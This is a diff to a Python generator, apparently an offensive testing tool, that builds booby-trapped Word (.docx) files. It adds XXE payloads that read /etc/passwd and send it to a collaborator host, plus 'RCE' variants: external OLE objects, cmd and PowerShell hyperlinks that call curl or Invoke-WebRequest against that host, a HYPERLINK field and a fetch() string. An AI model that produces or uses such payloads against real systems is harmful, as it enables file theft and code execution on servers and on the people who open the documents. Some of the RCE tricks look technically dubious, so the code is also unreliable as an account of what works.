@@ -34,6 +34,9 @@ def generate_docx_payloads(output_dir, burp_collab, tech_filter='all', payload_t
     if should_generate_type('xxe'):
         xxe_dir = output_dir / 'xxe'
         xxe_dir.mkdir(exist_ok=True)
+    if should_generate_type('rce') or should_generate_type('deserialization'):
+        rce_dir = output_dir / 'rce'
+        rce_dir.mkdir(exist_ok=True)
     if should_generate_type('xss'):
         xss_dir = output_dir / 'xss'
         xss_dir.mkdir(exist_ok=True)
@@ -227,6 +230,328 @@ def generate_docx_payloads(output_dir, burp_collab, tech_filter='all', payload_t
             f.write(f'''<?xml version="1.0"?>
 <!DOCTYPE root [<!ENTITY % x SYSTEM "{base_url}/xxe-docx">%x;]>
 <root>test</root>''')
+        
+        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+            for file_path in temp_dir.rglob('*'):
+                if file_path.is_file():
+                    arcname = file_path.relative_to(temp_dir)
+                    zip_ref.write(file_path, arcname)
+        
+        shutil.rmtree(temp_dir, ignore_errors=True)
+        
+        doc = Document()
+        doc.add_paragraph('Test')
+        docx_path = xxe_dir / "xxe9_customxml_file.docx"
+        doc.save(docx_path)
+        
+        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
+            temp_dir = output_dir / "temp_xxe9"
+            zip_ref.extractall(temp_dir)
+        
+        customxml_dir = temp_dir / "customXml"
+        customxml_dir.mkdir(parents=True, exist_ok=True)
+        with open(customxml_dir / "item1.xml", 'w', encoding='utf-8') as f:
+            f.write('''<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>''')
+        
+        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+            for file_path in temp_dir.rglob('*'):
+                if file_path.is_file():
+                    arcname = file_path.relative_to(temp_dir)
+                    zip_ref.write(file_path, arcname)
+        
+        shutil.rmtree(temp_dir, ignore_errors=True)
+        
+        doc = Document()
+        doc.add_paragraph('Test')
+        docx_path = xxe_dir / "xxe10_customxml_param.docx"
+        doc.save(docx_path)
+        
+        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
+            temp_dir = output_dir / "temp_xxe10"
+            zip_ref.extractall(temp_dir)
+        
+        customxml_dir = temp_dir / "customXml"
+        customxml_dir.mkdir(parents=True, exist_ok=True)
+        with open(customxml_dir / "item1.xml", 'w', encoding='utf-8') as f:
+            f.write(f'''<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "{base_url}/xxe-docx-param">
+%remote;
+]>
+<root>&data;</root>''')
+        
+        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+            for file_path in temp_dir.rglob('*'):
+                if file_path.is_file():
+                    arcname = file_path.relative_to(temp_dir)
+                    zip_ref.write(file_path, arcname)
+        
+        shutil.rmtree(temp_dir, ignore_errors=True)
+        
+        doc = Document()
+        doc.add_paragraph('Test')
+        docx_path = xxe_dir / "xxe11_customxml_nested.docx"
+        doc.save(docx_path)
+        
+        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
+            temp_dir = output_dir / "temp_xxe11"
+            zip_ref.extractall(temp_dir)
+        
+        customxml_dir = temp_dir / "customXml"
+        customxml_dir.mkdir(parents=True, exist_ok=True)
+        with open(customxml_dir / "item1.xml", 'w', encoding='utf-8') as f:
+            f.write(f'''<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "{base_url}/xxe-docx-nested">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{base_url}/xxe-docx-exfil?data=%file;'>">
+%remote;
+%eval;
+%exfil;
+]>
+<root>test</root>''')
+        
+        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+            for file_path in temp_dir.rglob('*'):
+                if file_path.is_file():
+                    arcname = file_path.relative_to(temp_dir)
+                    zip_ref.write(file_path, arcname)
+        
+        shutil.rmtree(temp_dir, ignore_errors=True)
+        
+        doc = Document()
+        doc.add_paragraph('Test')
+        docx_path = xxe_dir / "xxe12_settings_xml.docx"
+        doc.save(docx_path)
+        
+        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
+            temp_dir = output_dir / "temp_xxe12"
+            zip_ref.extractall(temp_dir)
+        
+        settings_path = temp_dir / "word" / "settings.xml"
+        if settings_path.exists():
+            with open(settings_path, 'r', encoding='utf-8') as f:
+                content = f.read()
+            content = content.replace('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>', 
+                                    f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE settings [<!ENTITY xxe SYSTEM "{base_url}/xxe-docx-settings">]>
+''')
+            content = content.replace('<w:settings', '&xxe;<w:settings')
+            with open(settings_path, 'w', encoding='utf-8') as f:
+                f.write(content)
+        
+        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+            for file_path in temp_dir.rglob('*'):
+                if file_path.is_file():
+                    arcname = file_path.relative_to(temp_dir)
+                    zip_ref.write(file_path, arcname)
+        
+        shutil.rmtree(temp_dir, ignore_errors=True)
+    
+    if should_generate_type('rce') or should_generate_type('deserialization'):
+        doc = Document()
+        doc.add_paragraph('Test')
+        docx_path = rce_dir / "rce1_ole_object.docx"
+        doc.save(docx_path)
+        
+        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
+            temp_dir = output_dir / "temp_rce1"
+            zip_ref.extractall(temp_dir)
+        
+        document_xml_path = temp_dir / "word" / "document.xml"
+        if document_xml_path.exists():
+            tree = ET.parse(document_xml_path)
+            root = tree.getroot()
+            
+            ns = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main',
+                  'o': 'urn:schemas-microsoft-com:office:office',
+                  'v': 'urn:schemas-microsoft-com:vml'}
+            
+            for p in root.findall('.//w:p', ns):
+                r = ET.SubElement(p, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}r')
+                object_elem = ET.SubElement(r, '{urn:schemas-microsoft-com:office:office}OLEObject')
+                object_elem.set('{urn:schemas-microsoft-com:office:office}ProgID', 'cmd')
+                object_elem.set('{urn:schemas-microsoft-com:office:office}ShapeID', 'rIdOLE1')
+                break
+            
+            tree.write(document_xml_path, encoding='utf-8', xml_declaration=True)
+            
+            rels_path = temp_dir / "word" / "_rels" / "document.xml.rels"
+            rels_tree = ET.parse(rels_path)
+            rels_root = rels_tree.getroot()
+            
+            rel = ET.SubElement(rels_root, '{http://schemas.openxmlformats.org/package/2006/relationships}Relationship')
+            rel.set('Id', 'rIdOLE1')
+            rel.set('Type', 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject')
+            rel.set('Target', f'{base_url}/rce-docx-ole1')
+            rel.set('TargetMode', 'External')
+            
+            rels_tree.write(rels_path, encoding='utf-8', xml_declaration=True)
+        
+        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+            for file_path in temp_dir.rglob('*'):
+                if file_path.is_file():
+                    arcname = file_path.relative_to(temp_dir)
+                    zip_ref.write(file_path, arcname)
+        
+        shutil.rmtree(temp_dir, ignore_errors=True)
+        
+        doc = Document()
+        doc.add_paragraph('Test')
+        docx_path = rce_dir / "rce2_hyperlink_cmd.docx"
+        doc.save(docx_path)
+        
+        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
+            temp_dir = output_dir / "temp_rce2"
+            zip_ref.extractall(temp_dir)
+        
+        document_xml_path = temp_dir / "word" / "document.xml"
+        if document_xml_path.exists():
+            tree = ET.parse(document_xml_path)
+            root = tree.getroot()
+            
+            ns = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main',
+                  'r': 'http://schemas.openxmlformats.org/officeDocument/2006/relationships'}
+            
+            for p in root.findall('.//w:p', ns):
+                r = ET.SubElement(p, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}r')
+                hyperlink = ET.SubElement(r, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}hyperlink')
+                hyperlink.set('{http://schemas.openxmlformats.org/officeDocument/2006/relationships}id', 'rIdRCE2')
+                t = ET.SubElement(hyperlink, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}t')
+                t.text = 'click'
+                break
+            
+            tree.write(document_xml_path, encoding='utf-8', xml_declaration=True)
+            
+            rels_path = temp_dir / "word" / "_rels" / "document.xml.rels"
+            rels_tree = ET.parse(rels_path)
+            rels_root = rels_tree.getroot()
+            
+            rel = ET.SubElement(rels_root, '{http://schemas.openxmlformats.org/package/2006/relationships}Relationship')
+            rel.set('Id', 'rIdRCE2')
+            rel.set('Type', 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink')
+            rel.set('Target', f'cmd:///c curl {base_url}/rce-docx-cmd1')
+            rel.set('TargetMode', 'External')
+            
+            rels_tree.write(rels_path, encoding='utf-8', xml_declaration=True)
+        
+        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+            for file_path in temp_dir.rglob('*'):
+                if file_path.is_file():
+                    arcname = file_path.relative_to(temp_dir)
+                    zip_ref.write(file_path, arcname)
+        
+        shutil.rmtree(temp_dir, ignore_errors=True)
+        
+        doc = Document()
+        doc.add_paragraph('Test')
+        docx_path = rce_dir / "rce3_hyperlink_powershell.docx"
+        doc.save(docx_path)
+        
+        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
+            temp_dir = output_dir / "temp_rce3"
+            zip_ref.extractall(temp_dir)
+        
+        document_xml_path = temp_dir / "word" / "document.xml"
+        if document_xml_path.exists():
+            tree = ET.parse(document_xml_path)
+            root = tree.getroot()
+            
+            ns = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main',
+                  'r': 'http://schemas.openxmlformats.org/officeDocument/2006/relationships'}
+            
+            for p in root.findall('.//w:p', ns):
+                r = ET.SubElement(p, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}r')
+                hyperlink = ET.SubElement(r, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}hyperlink')
+                hyperlink.set('{http://schemas.openxmlformats.org/officeDocument/2006/relationships}id', 'rIdRCE3')
+                t = ET.SubElement(hyperlink, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}t')
+                t.text = 'click'
+                break
+            
+            tree.write(document_xml_path, encoding='utf-8', xml_declaration=True)
+            
+            rels_path = temp_dir / "word" / "_rels" / "document.xml.rels"
+            rels_tree = ET.parse(rels_path)
+            rels_root = rels_tree.getroot()
+            
+            rel = ET.SubElement(rels_root, '{http://schemas.openxmlformats.org/package/2006/relationships}Relationship')
+            rel.set('Id', 'rIdRCE3')
+            rel.set('Type', 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink')
+            rel.set('Target', f'powershell://Invoke-WebRequest {base_url}/rce-docx-ps1')
+            rel.set('TargetMode', 'External')
+            
+            rels_tree.write(rels_path, encoding='utf-8', xml_declaration=True)
+        
+        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+            for file_path in temp_dir.rglob('*'):
+                if file_path.is_file():
+                    arcname = file_path.relative_to(temp_dir)
+                    zip_ref.write(file_path, arcname)
+        
+        shutil.rmtree(temp_dir, ignore_errors=True)
+        
+        doc = Document()
+        doc.add_paragraph('Test')
+        docx_path = rce_dir / "rce4_field_macro.docx"
+        doc.save(docx_path)
+        
+        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
+            temp_dir = output_dir / "temp_rce4"
+            zip_ref.extractall(temp_dir)
+        
+        document_xml_path = temp_dir / "word" / "document.xml"
+        if document_xml_path.exists():
+            tree = ET.parse(document_xml_path)
+            root = tree.getroot()
+            
+            ns = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'}
+            
+            for p in root.findall('.//w:p', ns):
+                fldSimple = ET.SubElement(p, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}fldSimple')
+                fldSimple.set('{http://schemas.openxmlformats.org/wordprocessingml/2006/main}instr', f'HYPERLINK "{base_url}/rce-docx-field1"')
+                r = ET.SubElement(fldSimple, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}r')
+                t = ET.SubElement(r, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}t')
+                t.text = 'click'
+                break
+            
+            tree.write(document_xml_path, encoding='utf-8', xml_declaration=True)
+        
+        with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+            for file_path in temp_dir.rglob('*'):
+                if file_path.is_file():
+                    arcname = file_path.relative_to(temp_dir)
+                    zip_ref.write(file_path, arcname)
+        
+        shutil.rmtree(temp_dir, ignore_errors=True)
+        
+        doc = Document()
+        doc.add_paragraph('Test')
+        docx_path = rce_dir / "rce5_embedded_script.docx"
+        doc.save(docx_path)
+        
+        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
+            temp_dir = output_dir / "temp_rce5"
+            zip_ref.extractall(temp_dir)
+        
+        document_xml_path = temp_dir / "word" / "document.xml"
+        if document_xml_path.exists():
+            tree = ET.parse(document_xml_path)
+            root = tree.getroot()
+            
+            ns = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main',
+                  'm': 'http://schemas.microsoft.com/office/2004/12/omml'}
+            
+            for p in root.findall('.//w:p', ns):
+                r = ET.SubElement(p, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}r')
+                object_elem = ET.SubElement(r, '{http://schemas.microsoft.com/office/2004/12/omml}oMathPara')
+                script_elem = ET.SubElement(object_elem, '{http://schemas.microsoft.com/office/2004/12/omml}oMath')
+                t = ET.SubElement(script_elem, '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}t')
+                t.text = f'fetch("{base_url}/rce-docx-script1")'
+                break
+            
+            tree.write(document_xml_path, encoding='utf-8', xml_declaration=True)
         
         with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
             for file_path in temp_dir.rglob('*'):
